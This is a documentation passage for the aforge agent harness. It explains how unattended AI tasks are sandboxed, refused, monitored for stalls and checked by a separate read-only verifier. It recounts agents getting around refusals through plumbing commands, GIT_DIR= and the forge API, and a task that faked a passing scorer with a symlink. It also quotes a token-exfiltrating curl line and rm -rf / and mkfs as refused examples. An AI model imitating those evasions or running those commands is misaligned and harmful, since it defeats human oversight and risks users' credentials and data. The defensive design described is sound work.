> changing out there in your report; what you write in your copy comes home on its own.

**The machine's scratch is not yours.** `/tmp`, the temp directory and `/dev/null` are
written freely — that is where a command line puts what it is about to read back.

**What it cannot see.** It reads the paths a command *names*. `cd elsewhere && python
fix.py`, where the script writes what it likes, is not caught, and neither is a path built
out of a shell variable. What it does close is every shape that says its target out loud.

**Why it exists.** A conversation opened in a home directory handed out two tasks whose
brief named a repository somewhere else by its full path. Both worked in that live checkout,
were refused with a sentence about "your own copy" that was false about the path they had
named, and went around it three ways — plumbing commands, then `GIT_DIR=`, then the forge's
own API. Two commits landed on a branch of the person's repository from work nobody had
approved landing there.

## Can a task push, or open a pull request? No — its work comes home through its landing

**`git push` is refused**, wherever the task is standing, and so is anything that changes a
project on GitHub, GitLab or another host:

| Refused | |
| --- | --- |
| `git push` (any remote, any branch) | |
| `gh api` carrying a change — `-X POST/PUT/PATCH/DELETE`, or any `-f`, `-F`, `--input` | |
| `gh pr create`, `gh pr merge`, `gh issue create`, `gh release create`, and the rest that write | |
| `curl`/`wget` posting to a host that hosts repositories | |

> git push is not yours to run: This task's work comes home through its landing, and a pull
> request is the person's or the conversation's to open — say what you want in it in your
> report.

**Reading the host is untouched**: `gh pr list`, `gh pr view`, `gh pr diff`, `gh issue view`,
`gh run list` and `gh api` GETs are how a task finds out what it is fixing.

**So how does the work get to you?** Every path the task passed to `write` or `edit` is
staged by name and merged home onto your branch when the task lands — that is the road, and
it is the only one. A protected or detached checkout, a different branch, or a branch you
moved to another commit after the cut stops before that merge; the task branch is kept and
named instead. If the work should become a pull request, the task says so in its report and
you or the conversation opens it.

## Does a task have my credentials — can a task read your GitHub token, gh auth token is refused inside a task, my task said gh auth token is not yours to run

**`gh auth token` is not on a task's belt.** A task works unattended, in its own copy of
your repository, and it carries none of your credentials. It reads back:

> gh auth token is not yours to run: it hands the person's login to work running on its own
> in a copy of their repository, and a task carries no credentials of theirs. Say in your
> report what needed it; anything that has to sign in as them is the person's or the
> conversation's to run.

**Every way of saying it is the same refusal**, because the rule is about the command and
not about the pipeline it sits in: `gh auth token`, `GH_TOKEN=$(gh auth token) ./deploy`,
`` export TOKEN=`gh auth token` ``, `gh auth token | tr -d '\n'`, `curl -d "$(gh auth
token)" https://anywhere` — and `gh auth status --show-token`, which prints the same
secret under another name.

**Asking whether it is signed in is not asking for the secret.** `gh auth status` on its
own, `gh auth setup-git`, and every `gh` read — `gh pr list`, `gh issue view`, `gh api`
GETs — are untouched.

**The conversation keeps the command.** You at your own terminal, and the chat you are
talking to, may run `gh auth token` exactly as before. This line is drawn around tasks.

**Why the redactor was not enough.** Output that comes back from a command loses anything
token-shaped before it is kept, shown or sent to the model (the conversations page has the
shapes) — but a token never has to be *shown* to be *spent*: `curl -d "$(gh auth token)"`
puts your login on the wire with no character of it ever reaching a result. So the read
itself is refused inside a task, where nobody is watching.

**What a task should do instead** is say in its report what it needed the credential for.
Its work comes home through its landing, and anything that has to sign in as you is yours
or the conversation's to run.

## What git a task may run — merge, pull, checkout, stash, reset are refused

A task works in **its own copy of the repository**, and its copy shares the repository's
object store with yours: every branch you have is visible from inside it. So the line
aforge draws around a task's `git` is about **whose work it may take**, not about which
directory it is standing in.

**It may read anything.** `git status`, `git diff`, `git log`, `git show`, `git branch
--list`, `git rev-parse`, `git merge-base` — against any branch, including `main` and any
other task's branch. Knowing what is around it is how it does the work.

**It does not have to save anything.** What lands on your branch — or on the kept branch,
where your checkout is one aforge will not write — is every path the task passed to `write`
or `edit`, staged by name on the way home — the task is told not to stage
its own work, and `git add` and `git commit` are neither needed nor refused.

**It may not move its copy onto work it did not do, and may not reach a remote.** These are
refused before they run, and the task reads the refusal and keeps working:

| Refused | Because |
| --- | --- |
| `merge`, `rebase`, `cherry-pick`, `revert`, `checkout`, `switch`, `am`, `apply`, `worktree`, `update-ref` | they put somebody else's commits into the task's copy, and only what the task writes there comes home |
| `pull`, `fetch`, `clone`, `remote`, `submodule` | they bring in work the task did not do, and a task reports what it writes as its own |
| `push` | a task's work comes home through its landing, not over a remote (the section above) |
| `stash`, `stash pop`, `stash apply` | a stash that will not go back cleanly leaves raw conflict markers in files nobody looks at again (`git stash list` and `git stash show` are fine) |
| `reset --hard`, `--merge`, `--keep`, and `restore --source` | they throw the working copy away or fetch a file off another branch (plain `git reset` to unstage, and `git restore <path>`, are fine) |

The wording it reads names the verb and what it may do instead, for example:

> git merge is not yours to run: it would put work this task did not do into your copy, and
> only what you write here comes home. Look with git status, diff, log and show — any
> branch, as much as you want. What you write with write and edit in this copy comes home
> on its own.

**These sentences are for the task's OWN copy, and are never said about anywhere else.** A
command aimed at another directory is answered by the path law above instead — "outside your
copy" — because "this is your own copy" is false about a repository the task is not standing
in, and a refusal a model can see through is a refusal it goes around.

**None of this applies to you.** In your own conversation, in your own checkout, aforge
runs whatever git you ask for. The rule exists because a task reports work as *its own*,
and one that fast-forwarded onto `main` really did report somebody else's fixes as the
thing it had just built.

## How a task reports back to you

When a task lands, its **report** is its final assistant message, cut to the first **3
non-empty lines**, each clipped to **300 characters**.

A task is told to make those lines the **substance** of the work — what it found or made,
the key findings, the decisions it took, with every file named by its full path — and not
the evidence trail. "`git diff` shows a staged new file", test output, staging and branch
status and step counts are proof it did the work, and they stay in the task's journal.
On a finished task the report leads with the task's own account, and what the second look
checked it on stands under that.

The landing note arrives at a step boundary, exactly like a background job's exit. Its
first line carries the task's transcript URI:

```
task 7 finished: <title> · transcript file:///…
```

Then the report. Then, when there were changes, `changed: a.go, b.go`, and one line saying
where the branch went:

- `its branch task/… merged into yours`
- `its branch task/… was kept: your checkout is on dev, which aforge never writes to — merge it when you are ready`
- `its branch task/… was kept: your checkout has moved from feat/a to feat/b since the work was cut — merge it where you want it`
- `its branch task/… was kept: your checkout is not on a branch — check one out and merge it`
- `its branch task/… was kept: feat/x has moved on since the work was cut — merge it where you want it`
- `its branch task/… did not merge cleanly and was kept — merge it yourself when you are ready`
- `it was stopped; what it made is committed on its branch task/…, which was kept — merge that branch to take the work`
- `it was stopped; its branch task/… was kept` (when it made nothing)
- `it worked directly in the workspace: there was no repository to branch`

The task's own tool rows never enter the chat. They go to its journal and its room only.

**To read a finished task's report again later**, open the task from `/history` — `ctrl+.`,
or the `ctrl+. earlier` line at the bottom of the task column, which is the column's one
door onto that page. `enter` on an `earlier` row goes inside it, and the card
carries the whole of that final message — read back off the task's own journal — under
`what it said at the end`.

When a task's work does come home, the paths it wrote are staged by name — never
`git add -A`, and never `.aforge-v3` — then committed on its own branch as
`task: <first line of title, at most 72 chars>` with the identity
`aforge <aforge@localhost>`, then merged into an ordinary branch with `git merge --no-edit`.
A checkout on a protected branch, on a different branch than when the work was cut, on the
same branch at a commit the person moved after the cut, or detached, is left alone and the
task branch is kept instead. Commits written by aforge's own landings do not count as the
person moving it.
Otherwise the merge is attempted whatever your tree looks like — a dirty checkout is normal. On success
the working copy is removed and the branch is deleted. A merge that conflicts is abandoned,
the branch is kept, the working copy is given back, and the task needs your look. A commit
that could not be made at all stops the landing before the merge — nothing is merged,
nothing is given back, and the task needs your look (*My task could not save what it wrote*
above). Two tasks finishing at
once are serialized, so a merge is never lost.

## What aforge says in the chat when a task lands, and the full path to the file

Nobody typed the landing note, so aforge answers it as if you had asked for the work
directly: what it writes next is **the answer itself** — the findings, the summary of what
was made, what it changes.

The card the landing writes into the conversation already says the task finished, how long
it took, how many files it touched and where the branch went, so aforge does not say that
again, and it does not grade the deliverable. "In good shape", "solid", "genuinely non-trivial" are sentences *about* the
work in place of the work, and so is narrating what it did to get there.

When the report is too thin to answer from, aforge reads the deliverable and answers out of
what is in it. The message is the answer; the file is the deep dive.

## Why did the chat reply on its own

A finished task can arrive while you are not typing. Its landing note starts the turn
that answers the work, so the answer may appear on its own. Immediately above that reply,
aforge draws a dim line with the task's identity mark, its name, and the exact words you
originally asked it to handle. That line is part of the transcript and returns when you
resume the conversation. The finished-task card still stays above the input as before.

An ordinary reply to something you typed has no such line. If an old task has no recorded
request, the line shows its identity mark and name alone rather than an empty quotation.
If several tasks arrive before one answer, their lines are stacked in arrival order above
that answer.

**That reply is priced exactly like one you typed.** It climbs the same three points, has the
same ceiling, and is handed to a task the same way — see *An answer that runs long is read and
moved* in *Tasks*. It used to be exempt, and a measured run had one such reply grind for 46
minutes with nobody watching and then leave the session idle for seven and a half hours.

## Which task is this answer about

Read the dim line immediately above the answer. Its task mark and short name are the same
identity used for that task in the task column and its finished card; the quoted text is
your original request verbatim, not the more detailed brief prepared for the worker. More
than one line means the answer is responding to all of those finished tasks, top to bottom.

**Every file aforge names you is named by its full absolute path** — after a task and
everywhere else in the conversation. A relative path like `research/notes.md` is one you
would have to work out a root for, and a task that ran in a copy of its own
makes even that a guess.

## Does a task proposal expire while I am in another conversation

**Yes, and it starts the work.** A task proposal counts its own deadline down
inside the session rather than on the screen, so it is unaffected by which
conversation you are looking at: when the countdown runs out the task is
approved and starts, exactly as it would have on a screen you were watching.
A sign-in offer counts down the same way and lapses after five minutes, deciding
nothing.

**The approval question for a tool call is the one that holds.** A conversation
you have switched away from holds it for as long as you are away, and coming back
gives you the reading time you had left — see the permissions page.

All three say `waiting on you` while they wait: on home, on the status line's
`2 open · 1 waiting`, and in a desktop notification the moment the question goes
up — which now fires for a conversation this terminal is holding behind the
screen even while the terminal is focused, because a focused terminal is no
longer evidence that anybody is looking at *that* conversation.

## How long a task gets before it is stopped

Two clocks, and neither is a hard stop.

**One hour per checkpoint.** The run, every correction round and every check inside it
share a 60-minute interval — but when it fires, a second look decides what
happens next. That look stands in the task's own working copy and has to open it: an answer
given without reading anything is sent back once, told so, and the second answer is the one
that counts. Working toward the brief: the task gets another hour, up to five in all
(5 hours is the hard backstop, and a healthy task never meets it). Circling: it is told to
land now — one final turn to write the deliverable from what it already has — and only
then is it stopped, with the threshold and the evidence in the report.

**What the landing turn may still do.** It keeps only the tools that SAVE something
before the call returns: `write`, `edit`, `edit_video` where this machine has ffmpeg,
and — when the task had them — `generate_image`
and `speak`. Everything else comes off, and the instruction names exactly the hands it
kept, so a task whose deliverable is a picture, a voiceover or a joined cut can still
produce it.
`generate_video` and `generate_music` are **not** kept, even by a task that had them: they
answer with a background job and land minutes later, and the task is closed the moment
its landing turn ends — a render started there would be stopped before the file existed.
Reading, searching and running commands are gone for that turn too: it is a turn for
finishing, not for one more look.

**Time a task spends waiting for its own command still spends the hour.** When a foreground
command runs past `background after` and keeps running as a job, the task waits for it
rather than polling it — but those are minutes the task's own build or test run is taking,
so the hour runs through them. (Waiting on *sub-tasks* is the opposite case and costs
nothing: that work is somebody else's, and the clock stops for it.) No single wait outlasts
one whole hour: if the command is still going then, the task is asked again and the ordinary
checkpoint below decides whether it gets another.

**Five minutes for a check.** Each second look at finished work is bounded at 5 minutes.
It hangs off the task's own clock, so `jobs kill` ends it too. A check that burned its
whole five minutes is not retried.

There are two step limits as well, and they work the same way — checkpoints, not killers:

| Limit | Per checkpoint | Backstop | Report when it finally stops |
| --- | --- | --- | --- |
| `max_steps` — finished tool calls | 200 | 1000 (200 × 5) | `stopped: 200 steps and no finish` |
| `no_progress` — calls in a row that teach nothing, ask nothing new, save nothing and leave nothing new in its working copy | 6 | 6 (this one fires) | `stopped: 6 steps without progress` |

At a `max_steps` checkpoint the same second look runs: progress buys another 200 steps, up
to the 1000-step backstop. Whatever stops the work, the landing turn runs first — the task
writes up what it has — so nothing is ever lost mid-flight. And a task stopped this way is
still checked against its acceptance afterwards: if the work holds it lands finished and
merges, and the `stopped:` line never reaches you.

## The repeat checkpoint — a task that keeps saving the same thing

A successful save always counted as progress, so a task rewriting one file with the same
bytes reset `no_progress` on every call and nothing but the 200-step budget stood in its
way. One really did: twenty-odd rewrites of a single file over twenty-two minutes, every
call clean.

So aforge fingerprints what each call **produced** — the bytes of the file a saving call
wrote, or the answer any other call brought back — and counts how many in a row produced
something it had already produced. The same count covers a search run twice with the same
query, an API called again with the same body and a page downloaded twice; it is not about
files.

When that run reaches the task's own `no_progress` number, the second look runs. It is
handed the count in words — `the last 6 write calls produced byte-identical content` — in
front of the list of calls, and it is told to read the working copy before it answers.
**Nothing is stopped by the count itself.** Told the task is still working, the run starts
again from zero and the task carries on with no extra steps and no extra time; told it is
circling, the landing turn runs and the report reads
`stopped at repeat checkpoint: <what it said>`. There is no number anywhere saying how many
identical saves are too many, and `no_progress` is on the wire — a task whose work is
legitimately repetitive can raise it.

## What "bringing the work home" tells the task, and why a tool says it was withdrawn

When the landing turn takes a tool away, a task that reaches for it anyway is not told the
tool is unknown. It is told it was **withdrawn**, and the answer carries three things: why
it is gone (`bash was withdrawn from your tools: the work is being brought home`), the
**exact list of what it still has** by name, and what to do with them — finish what it is
saving and stop, because calling it again cannot bring it back and there is nothing left to
run or poll.

This is the difference between an eighteen-byte `Unknown tool: bash` and a sentence. One
really happened: a task lost `bash`, `read` and `grep` when it was landed, was answered
`Unknown tool` eight times, retried each call because nothing told it the hand was gone for
good, and worked out what had happened only in its very last words. A name that was **never**
on the belt still answers `Unknown tool: <name>` — that one is a genuine mistake by the
model, and the two are deliberately worded differently.

**Nothing the harness refuses is counted against the task.** A withdrawn tool and a call a
permission rule turned down are the harness's own answers, not the task working badly: they
never advance the no-progress counter, never reset it, and never earn a `[stuck]` note. They
are still steps, they still cost, and they are still in the task's transcript.

**Files saved after a withdrawal are reported as unverified.** If a task had been running
its work with `bash`, lost it to the landing turn, and then saved something anyway, its
report says `incomplete — nothing checked the files it saved after its tools were withdrawn
— they were never built or run`. It stands at the head of the report, directly under the
limit that fired, so nobody reading it — you, or the conversation that started the task —
takes those last edits for finished work. It says nothing about whether they are right,
only that nothing looked at them.

## What counts as progress, and what gets a task stopped as stuck

The `no_progress` counter resets on any one of three things, and only fires when a step is
none of them:

**It saved a file.** A successful `edit`, `write`, `edit_video`, `generate_image`,
`generate_music`, `generate_video` or
`speak` — every hand that puts a file on disk at a path the call names. Making a picture is
working; a task asked for two marketing images that generates them, looks at them and
generates them again has never called `edit` in its life, and is not stuck. The same goes
for a task cutting a film: joining clips, saving a frame and scoring the cut are all work.

**It changed its working copy.** Any step at all — whatever tool it was — that left the task's
working copy different from how the step before it found it. This is the backstop under
everything else, so a tool nobody classified still counts when it actually produced
something. Anything under `.aforge-v3` is excluded: what the harness leaves there is not
the task's work. Job logs and stubbed tool results are not even there any more — they are
kept with the conversation, under its own `logs/` — and the exclusion stays as the floor
under everything else aforge may leave in a checkout.

**It learned something.** A read-only call — `read`, `read_document`, `ls`, `grep`, `find`,
`web_search`, `web_fetch`, `jobs`, `recall`, `view_image`, `manual`, `tasks`, `settings`,
`list_harnesses`, `services`, `gmail_read`, `gmail_search`, `calendar_list`, `slack_search`,
`slack_read_thread`, `slack_list_channels` — or a `bash`, **whose answer was more new than
old**. A failed one still counts as learning: finding out that something does not work is
finding something out.

"Whose answer was more new than old" is measured **line by line, not result by result**.
aforge remembers the lines a task has already been shown, and counts how many of a
result's lines are ones it has never been given. Nothing is stripped out or excused first:
a line is the same line, or it is not.

The reason is a shape that looks like work and is not. A task re-runs its own check
against something it has stopped changing; the check prints the time it started, so every
run comes back with one new line in sixteen and fifteen the task already had. Counting
whole results, that is six discoveries in a row and the task can spin for hours. Counting
lines, it is what it is — six per cent new — and the counter fires.

**But that count only decides a re-measurement, and two other things count on their own.**
Half a rule was landing tasks in the middle of real work, so the whole rule is:

- **A reading taken over work that has just changed is information whatever it says.** Edit
  a file, rebuild, run the check: the build reprints the same warnings and the check
  reprints the same table with three numbers moved. Almost nothing in either is new, and
  both told the task something — it measured a state that had never existed before, and
  finding out that an edit moved little is finding something out. One reading gets this;
  the second re-run of an unchanged check is a re-measurement again.
- **A question the task has never asked, whose answer brought something back, is
  information.** Pulling six different records out of a corpus of pretty-printed JSON gives
  six answers that are mostly `    {` and `  }` — twenty per cent new lines at best — and
  the task is learning six things it did not know. What is *not* information is a new
  question whose answer holds nothing new at all: nine different `sleep N && tail` commands
  answered `(no output)` nine times are nine steps of nothing, and that is the counter's
  oldest catch.

So what actually fires the counter is **a step that changed nothing, asked nothing new, and
brought back almost nothing new** — the same search six times, the same failing edit
retried, a measurement re-run over work that has not moved. `note`, `forget`, `track`,
`commit` and `change_setting` are deliberately not progress: a task writing its own memory
again has not learned anything.

Failure matters for saving and not for learning. A `generate_image` that came back with an
API error saved no file, so a task calling it repeatedly and getting the same error is
stuck and is stopped — which is what the counter is for.

**A failure aforge itself produced is never counted, in either direction.** A tool that was
withdrawn from the task's belt, and a call a permission rule refused before it ran, are
answers written on this side of the wall: the tool never ran and the world never saw the
call. Those steps do not advance the counter, do not reset it, and do not earn the task a
`[stuck]` note telling it to stop repeating itself. The reason is the run that produced this
rule: a task was disarmed mid-flight, answered `Unknown tool` eight times, and was then
nudged three times for the retries the harness had just manufactured.

**A task that handed parts of its work out waits for them, and that wait is never counted
as being stuck.** While any part is still running the counter does not advance, nothing is
asked of the task, and its clock does not run: its row shows `waiting · its parts`, and the
next thing it is asked is the one turn that carries every part's report at once. The counter
starts again from zero when the last report lands, so a task that spins over the *fold* is
caught exactly as any other is. A failed part is a report too: its failure reason reaches
that same turn beside the successful reports, so the parent integrates what landed and says
what is missing or retries it. The failed part does not stop the parent, and delayed steps
from before the report landed cannot spend the fresh allowance before the parent reads it.

**A task waiting for a command it started is not being stuck either.** A foreground `bash`
call that runs past `background after` keeps running as a job (`still running as job 3`) —
and inside a task the work then *waits* for that command instead of asking what to do next.
Nothing is asked over the wait, no step is counted, and no `[stuck]` note can be earned,
because a task that is waiting makes no calls at all. What wakes it is the command's own
ending, and that ending arrives whole: the exit line, the command's last lines, and the path
to the full log, all in the one turn. This is why a task does not `sleep` and `tail` its own
build or test run — the waiting is done for it, and those nine `sleep N && tail` steps above
are what the counter catches when something is polled that nobody is waiting on. A command
started with `background: true` is the other case: a server or a sweep the task deliberately
left running holds nothing up, and the task is asked its next step straight away.

**A task that repeats itself is told what the work has been doing.** Before it is stopped it
gets a `[stuck]` note, and that note now carries one more fact than the repetition itself:
*the work has not changed since step 12; nine results since brought nothing new*. aforge
knows which steps changed the deliverable — the files the task's own `write`, `edit` or
generating hands saved — so it can say when that last happened and what the steps since
brought back. The same line appears in the short account a checkpoint hands to whoever
looks at the task: `work last changed: step 12 · results since: 9 · new lines since: 4%`.
The clock sentence is a description and not a rule by itself. The session loop separately
uses the same ledger for one structural rule the sentence makes visible: after five
consecutive tool rounds in which every result has no fresh line, it adds a `[stuck]` note
saying the answer is already in the transcript. Fresh information or a successful write
resets that streak. The task-level no-progress counter above remains the rule that stops an
entire task run.

Being stopped as stuck says **nothing** about the deliverable: a stopped task is still
checked against its acceptance, and when the check passes it lands finished and merges with
the `stopped:` line gone. The section below is that whole rule.

## A task stopped as stuck that had already finished its work

Being stopped is a statement about the **trajectory**, never about the deliverable. One of
these really happened: a task wrote all six of the stories it was asked for, spent six steps
re-reading them to be sure, and was stopped with `stopped: 6 steps without progress` — the
same target twice is exactly the spin the counter is for. Its own landing turn then said the
six files were written and the work was done. The check did not accept that claim, so you
saw `! incomplete`, a kept branch, and the check's reason next to the report saying it had
finished.

So a stopped task is still judged on its work. After the landing turn writes up what it has,
the same check a task that finished on its own gets is run — the same acceptance, the same
working copy, the same read-only checker.

**If the work holds:** the task lands **finished**. Its branch merges into an ordinary
checked-out branch, or is kept when the checkout is protected, moved or detached, and
`stopped: 6 steps without progress` is nowhere in what you read. The report is the task's own
account of the work with what it was checked on under it, exactly as any finished task's is.
A limit that fired is not news about a deliverable that is sitting there.

**If it does not hold, or there was nobody to ask:** nothing changes. The report leads with
the limit that fired, the task's own last words stand under it, the branch is kept with the
work committed onto it, and nothing merges.

**One look, and no correction round.** A stopped task gets a single check — never the
`task.repair_rounds` worker a task that finished on its own can earn, because a second worker
in the working copy is paying twice for the run the limit has just ended. With `task.audit` off,
or with no acceptance to judge against, there is nobody to ask and the task simply stays
stopped.

## How aforge knows a task really finished

A task is never done on its own say-so. When the work finishes, a **separate, fresh,
read-only checker** is put in a clean restore of what the task wrote, runs the repository's
own checks, reads the diff, and answers. Only a pass merges.

The checker has no shared context and no memory of the work. Its whole world is the
acceptance you set, the task's own claim (labelled as a claim, not as evidence), the list
of files written, and where to look. **The brief is deliberately withheld** so it grades
the contract, not the effort.

**On work that started itself, the acceptance is your own message.** Nobody groomed a
done-condition for a task aforge started out of a reply, so what the checker is held against
is your request in full, framed as "everything asked for below is actually done — all of it,
not the part that was easiest to reach". Before that it was a generic line pointing at the
task's name, and on a long piece of work that meant a request being accepted as met the moment
the small piece the reply happened to be holding was finished.

What it may touch: `read`, `grep`, `find`, `ls`, and a `bash` restricted to an allowlist
built for **that one task** — see the next section. It cannot edit, write, install, fetch or
paint. Shell composition is refused outright: any of `; | & < > $ ( ) { }`, a backtick or a
newline in the command is turned away before the allowlist is even consulted. Every result
it reads is capped at 8000 bytes.

Before the check, new files are staged so the diff shows everything including brand-new
files. Staging happens once, so every look judges the same tree. In a workspace that is
not a repository the checker is told
`This workspace is not a repository, so there is no diff to read: check the files themselves.`

This is controlled by `task.audit`, **on by default**, and settable in your profile only.
With it off, the gate stands open, the task's own account merges, the task lands done, and
the report is marked `nothing checked this work: the task.audit setting is off` above the
task's own words. There are no correction rounds at all.

## What the work SAYS it did is checked too — claims, and the ones nothing could settle

**A landing's claims are its checklist.** Everything the work asserts about the world is a
claim: a clause under `invalidates:` in a note it wrote, and every line of its own account of
what it did. The check hunts each one against the tree that would land — not against the copy
the run left lying around it.

Two shapes are settled by looking, and cost nothing:

- **a claim that some exact text is gone** — quoted in backticks or quotes, in the same
  clause as the absence — is a search of everything that would land. The landing's own notes
  are not searched: a note saying `` `$0.00` `` is gone contains `$0.00` in the act of saying
  so;
- **a claim that things under a named place were updated** is a question about which files the
  landing wrote. Nothing written there, and the claim is false.

A claim that a **behaviour** changed cannot be settled by looking, so it is handed to the
checker as a written list, with the instruction to name any it could not settle.

**A claim the tree contradicts fails the check**, and the finding quotes the sentence back:
`it says "That exception is gone: ``$0.00`` is rendered nowhere." — but $0.00 is still in
status.go:4`, or `… — but nothing under docs/guide was written`. It reads on the card under
`incomplete —` like any other gap, and the work goes back for another go with it in front of
it. No model is asked for this one: the search is the whole of the evidence.

**A claim nothing settled is said out loud rather than passed over.** A check that comes back
holding, on a landing whose written note declared something nobody examined, adds
`nothing checked this claim:` and the sentence. Lines of the work's own prose are hunted and
put to the checker but never named this way — otherwise every card would carry the line.

**A task that handed parts out is checked on the whole tree its parts came home into.** Its
own files and its parts' files are both staged, both restored, and both named to the checker —
`Files it wrote:` for its own, `And the parts it handed out wrote, into the same tree:` for the
parts'. A part that did not land is not counted, because its work is not in the tree. Nothing
merges upward until that check answers.

## Which commands the checker is allowed — the task's own check, not a fixed list

**The checker is allowed the checks the work itself names.** There is no list of build tools
in aforge, and no setting that holds one. The commands its `bash` will accept come from three
places, and nothing else gets through:

- **the check your task declares** — a command the work names in its own half of the brief or
  in a `done when` sentence somebody actually wrote. A span in backticks
  (`` `bash verify.sh` ``, `` `make check` ``) and a shell-prompt line
  (`$ ./verify --quiet`) both count there and never in your words quoted above it. A pasted
  terminal session shows how you saw a bug; neither spelling turns it into commands to run
  against your tree. A wildcard the work names is honoured, so `` `verify.*` `` admits
  `verify.sh`;
- **the check the task itself used** — any command its worker issued, taken from the same
  tool results the checker is shown, read for **the one command that line runs**. A leading
  `cd <a directory in your tree> &&` is dropped — that only states the directory the task was
  working in — and so is everything after the first pipe, along with the redirections of output
  at the end of the line (`2>&1`, `> log`). So
  `cd /workspace/thing && cargo build --release 2>&1 | tail -3` contributes
  `cargo build --release`, which the checker then runs as one command, composing nothing. A
  `cd` to somewhere outside your tree contributes nothing at all, an arrow in the middle of the
  line leaves it composed and it contributes nothing, and a command that even a
  permit-everything policy would still stop and ask about — `rm -rf /`, `shutdown`, `mkfs` —
  never becomes one either;
- **the always-safe reading commands** — `git diff`, `git log`, `git status`, `git show`,
  `pwd`, `wc`, `head`, `cat`. These print and cannot change what is being judged. They are
  not verification, so a checker holding only these can read your work but cannot exercise
  it.

## How a named check matches what the checker runs

A check that names no file is matched as a prefix, field by field, so `make check` admits
`make check ./...` and does not admit `make checkout`. A check that **names a file in your
tree** is matched by which file it is instead — see the next section. **Every refusal names
what this particular check is allowed**, listing the task's own check first and the reading
commands after it, so the model reads the door in the same breath as the no.

**When the work names no check and issued nothing that looks like one**, the checker is told
so in as many words, told to judge from reading and answer, and given a much shorter window —
one minute rather than five. There is no slow command for it to wait on, and the failure this
replaced was a checker spending the full five minutes reaching for a door that was never
going to open. That was measured on a Rust deliverable: the allowlist used to be a fixed set
of Go verbs plus git, so on a project that was not Go the checker could confirm nothing at
all, exhausted its five minutes on all six attempts, and every one of them landed the task
needing your look.

## Why did it run chmod or reproduction steps from the issue I pasted

It harvests nothing from your pasted request as a check, whether the command is in backticks
or on a `$ ` prompt line. That remains true when nobody could write a separate `done when`
sentence and your words have to stand as that sentence: a terminal transcript is evidence
of how you saw the bug, not a check to run against the finished tree. A check in either
spelling still counts when a piece of work names it in its own half of the brief or somebody
actually writes it into a `done when` sentence.

## How the check is spelled — one file, and the ways that really start it

**A check that names a file in your tree is allowed under every spelling that really starts
that file.** If your brief says the check is `bash verify.sh` and `verify.sh` is really there,
the checker may run it as `verify.sh`, as `./verify.sh`, by its full path, or behind **the
interpreter the file itself names** — the program on its `#!` first line, or the program that
line hands to `/usr/bin/env`. So a file beginning `#!/usr/bin/env bash` is allowed
`bash verify.sh`, one beginning `#!/usr/bin/python3` is allowed `python3 check.py`, and any
path to that same program counts. **aforge holds no list of launchers**: the file answers the
question, which is why `rm verify.sh` is not a spelling of your check. Paths are resolved
against the directory the checker stands in and compared as files, so anything that starts the
same file is the same check, and a wildcard you wrote is resolved the same way — `verify.*`
names the file it actually matches on disk.

**A file that says nothing about being run** — no `#!` line and no executable bit — gets no
program word at all. It is run **the way your work ran it**: the exact spelling your brief
declared, or the exact command its worker issued. The refusal says so, as "the check
/path/data.txt declares no interpreter; run it the way the work ran it". A file with the
executable bit but no `#!` line is allowed its own bare spellings and nothing in front of them.

**What is still refused:** a different file (`bash other.sh`), the wrong interpreter
(`python3 verify.sh` for a bash script), arguments your brief never declared
(`bash verify.sh --flag` — one word, then the file, and nothing after it), an option where the
program word should be (`bash -x verify.sh`), and anything composed (`cd x && bash verify.sh`).
Where a check can be spelled, the refusal spells it out — "the check /path/verify.sh — run it
as `/path/verify.sh` or `bash /path/verify.sh`" — and the checker is told the same thing before
it types anything.

This was measured. On a Rust deliverable the checker was handed a door naming the project's own
script and then had five spellings of that one file refused in a row — the directory stated
first, the absolute path, the bare name, the name behind a program word, the name behind `./` —
so it gave up and read source code until its window ran out.

## Where the check runs — a clean restore, not the task's messy checkout

**The check does not run where the work happened.** It runs in a **clean restore**: the
repository as it stood before the task began, with exactly the files the task wrote laid
over it, and nothing else the run left lying about. The checker installs and builds there
itself — that is what its five minutes are for.

The reason is one measured failure. A task was asked to make a scorer pass; the scorer
looked for files at a path the repository did not keep them at, and instead of changing the
source the task made the path exist with `ln -sf`. It re-ran the scorer against its own
symlink, watched it pass, and reported the job finished — and the checker, standing in the
same directory with the same symlink under it, saw the same pass. What would have landed on
your branch was a change that stops working the moment it leaves that machine.

So **a passing check may not depend on state your branch does not carry**. A fixture the
task dropped somewhere by hand, a link it made so a path would resolve, a directory it
created outside its own writes, a value it set in the environment: none of it is in the
restore, so a check leaning on it fails there and the task comes back incomplete naming what
is missing. Installs, builds and caches are exempt — the checker makes those again.

How the restore is built depends on your workspace:

- **In a repository**, it is a fresh detached checkout of the task's own branch with the
  written files laid over it and staged, so `git diff --cached` still shows the whole change.
  It sits beside the task's own checkout with `-check` on the end of the name and shows up in
  `git worktree list` while the check runs, then is removed and pruned.
- **On a plain folder the task took a copy of**, it is a fresh copy of your folder — which
  the task never touched — with the written files laid over it.
- **In a workspace that is neither**, it is copied by the clock: everything that predates
  the task's start is the original tree, and everything younger that the task did not write
  is left out. A directory in which nothing predates the task — a `target/`, a
  `node_modules/` — is skipped whole.
- **When the restore cannot be made** — no repository and no record of when the work began,
  or a working copy of more than 20000 files — the check runs where it always did, in the
  task's own checkout, and the job log says why.

The task's own checkout is untouched by any of this, and the restore is removed as soon as
the answer is in.

## What the checker is shown of what the task already ran

The checker is also handed the **last few tool results of the task's own worker** — up to
six, each cut at 1200 bytes: what was called, with what, and what came back. It is the real
result the worker read, not a display copy.

That exists because a check is often the most expensive thing in the whole task. A checker
made to rediscover the command and run it twice from scratch spends its whole five minutes
and the task lands needing your look, which is exactly what was measured. Seeing what
already happened tells it which command the check even is.

It is **not** a shortcut to a pass. The checker is told where those results came from: in a
restore they came from the task's own copy — the one an answer may not rest on — so they can
settle a refusal outright (a check that failed, or a check nobody ever ran, needs no second
run to be believed) while anything that could pass there and fail in the restore has to be
settled in the restore. A task that never ran a tool leaves this out of the packet entirely.

## What the checker is shown of the ground itself — untracked files, and why a diff is not enough

The checker is also handed the **full manifest of the tree it is standing in**, headed
`THE GROUND, AS GIT SEES IT (\`git status --porcelain --untracked-files=all\`)`: every path
that is staged, every path changed and not staged, and every path that is **not tracked at
all**, one per line in git's own two-letter notation.

It is there because a diff is a view of the **tracked half** of a tree. A run was checked
against `git diff --cached` alone and the files the work turned on were untracked — nothing
had ever added them — so no diff showed them and the reading judged the whole change against
the parts that happened to be tracked. The manifest closes that: lines beginning `??` are
untracked, the block says so in as many words, and the checker is told to open them with
`read` if they matter to the acceptance.

Two things bound it. The listing stops at 100 paths and then says how many more there are,
so a checker knows it is looking at a prefix and can run the command itself. And aforge's
own metadata directory (`.aforge-v3`, where a job's log lives) is left out — that is this
program's droppings and never the work's. A workspace that is not a repository gets no
